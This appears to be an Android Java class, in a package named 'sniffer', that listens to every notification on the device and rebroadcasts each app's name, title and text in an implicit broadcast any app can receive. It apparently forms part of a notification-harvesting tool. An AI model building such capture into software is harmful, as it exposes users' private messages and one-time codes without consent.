package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import android.content.Intent;

public class NotificationService extends NotificationListenerService {
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String text = extras.getString(Notification.EXTRA_TEXT, "");
            String packageName = sbn.getPackageName();
            
            Intent intent = new Intent("com.v8.global.sniffer.NOTIFICATION");
            intent.putExtra("app", packageName);
            intent.putExtra("title", title);
            intent.putExtra("text", text);
            sendBroadcast(intent);
            
        } catch (Exception e) {
        }
    }
}
